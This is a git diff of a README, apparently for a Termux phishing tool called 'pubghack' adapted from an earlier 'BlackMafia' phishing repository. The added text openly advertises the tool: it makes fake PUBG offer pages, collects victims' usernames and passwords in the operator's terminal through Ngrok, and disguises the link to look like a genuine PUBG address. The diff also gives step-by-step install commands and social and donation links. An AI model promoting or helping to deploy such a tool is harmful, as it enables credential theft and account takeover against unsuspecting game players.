@@ -1,36 +1,50 @@
-![](https://img.shields.io/badge/lovehacker404-BlackMafia-orange?style=for-the-badge&logo=python.svg) 
 <p align="center">
-<img src="blackmafia21.jpg">
-<a href="#"><img title="Made in Pakistan" src="https://img.shields.io/badge/MADE%20IN-Pakistan-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
+<a href="https://instagram.com/sslri"><img title="instahack" src="https://s17.picofile.com/file/8427244250/Screenshot_2021_03_07_Text_to_ASCII_Art_Generator_TAAG_.png"></a>
 </p>
 <p align="center">
-  <img alt="lovehacker404' Github Stats" src="https://github-readme-stats.vercel.app/api?username=lovehacker404&show_icons=true&include_all_commits=true&hide_border=true" />
-<!--  <img alt="profile pic" width="195px" src="https://avatars2.githubusercontent.com/u/26059688?s=460&u=d41b000a62eab50d000c3da604d151cec27bd850&v=4" />  -->
-<!--  <img src="https://github-readme-stats.anuraghazra1.vercel.app/api/top-langs/?username=lovehacker404&hide=ruby,perl&hide_border=true" />  -->
+<a href="https://github.com/SSLRI"><img title="Github" src="https://img.shields.io/badge/sslri-brightgreen?style=for-the-badge&logo=github"></a>
+<a href="https://instagram.com/sslri"><img title="instagram" src="https://img.shields.io/badge/instagram-yousec Hackers-red?style=for-the-badge&logo=instagram"></a>
 </p>
 <p align="center">
-<a href="#"><img title="WhatsApp Num" src="https://img.shields.io/badge/WhatsApp%20Num-03094161457-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
-</p>
-<p align="center">
-<img src="blackmafia22.jpg">
-<p align="center">
-<p align="center">
-<a href="https://github.com/lovehacker404"><img title="Author" src="https://img.shields.io/badge/Author-lovehacker404-red.svg?style=for-the-badge&logo=github"></a>
-</p>
-<p align="center">
-<a href="https://github.com/lovehacker404/followers"><img title="Followers" src="https://img.shields.io/github/followers/lovehacker404?color=blue&style=flat-square"></a>
-<a href="https://github.com/lovehacker404/World/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/lovehacker404/World?color=red&style=flat-square"></a>
-<a href="https://github.com/lovehacker404/World/network/members"><img title="Forks" src="https://img.shields.io/github/forks/lovehacker404/World?color=red&style=flat-square"></a>
-<a href="https://github.com/lovehacker404/World/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/lovehacker404/World?label=Watchers&color=blue&style=flat-square"></a>
+<a href="https://github.com/sslri"><img title="Language" src="https://img.shields.io/badge/Made%20with-Bash-1f425f.svg?v=103"></a>
+<a href="https://github.com/sslri"><img title="Followers" src="https://img.shields.io/github/followers/evildevill?color=blue&style=flat-square"></a>
+<a href="https://github.com/sslri"><img title="Stars" src="https://img.shields.io/github/stars/evildevill/instahack?color=red&style=flat-square"></a>
+<a href="https://github.com/sslri"><img title="Forks" src="https://img.shields.io/github/forks/evildevill/instahack?color=red&style=flat-square"></a>
+<a href="https://github.com/sslri"><img title="Watching" src="https://img.shields.io/github/watchers/evildevill/instahack?label=Watchers&color=blue&style=flat-square"></a>
+<a href="https://github.com/sslri"><img title="Licence" src="https://img.shields.io/badge/License-MIT-blue.svg"></a>
 </p>
 
-# Installation :
+## ABOUT :
 
+pubghack Phishing tool is obviously a phishing tool that will allow you to Create phishing pages that look like the Pubg Offer page and when any user puts their username and password on that phishing page you will get the Credential in your termux terminal. This is a very simple phishing tool that uses Ngrok for port forwarding. A good thing about this tool is that, It will give you a Masked link that will already look like the original PUBG link.
 
-😈 `git clone https://github.com/lovehacker404/Phishing`
+# INSTALLATION [Termux]ッ :
 
-😈 `cd Phishing`
+* `apt-get update -y`
+* `apt-get upgrade -y`
+* `pkg install python -y`
+* `pkg install python2 -y`
+* `pkg install git -y`
+* `pip install lolcat`
+* `git clone https://github.com/SSLRI/pubghack`
+* `cd pubghack`
+* `bash BlackMafia.sh`
+```
+## CONNECT WITH US :
 
-👾 `bash BlackMafia.sh`
+<a href="https://github.com/sslri"><img title="Github" src="https://img.shields.io/badge/sslri-brightgreen?style=for-the-badge&logo=github"></a>
+[![Instagram](https://img.shields.io/badge/INSTAGRAM-FOLLOW-red?style=for-the-badge&logo=instagram)](https://instagram.com/sslri)
+[![Instagram](https://img.shields.io/badge/WEBSITE-VISIT-yellow?style=for-the-badge&logo=blogger)](https://sslri.ir)
+[![Instagram](https://img.shields.io/badge/LINKEDIN-CONNECT-red?style=for-the-badge&logo=linkedin)](https://linkedin/sslri)
+[![Instagram](https://img.shields.io/badge/FACEBOOK-LIKE-red?style=for-the-badge&logo=facebook)](https://facebook.com/saeeddsalari)
+[![Instagram](https://img.shields.io/badge/TELEGRAM-CHANNEL-red?style=for-the-badge&logo=telegram)](https://t.me/sslri)
+[![Instagram](https://img.shields.io/badge/WHATSAPP-JOINGROUP-red?style=for-the-badge&logo=whatsapp)](https://wa.me/989384491252)
+
+## BUY ME A COFFEE ᵔ.ᵔ :
+
+<p align="center">
+<a href="https://l.jeeb.io/YjcwM"><img title="sslri" src="https://camo.githubusercontent.com/ae8af018f80649f3d379eb23dbf59acceaffa24e/68747470733a2f2f6c69626572617061792e636f6d2f6173736574732f776964676574732f646f6e6174652e737667"></a>
+</p>
+
 
 
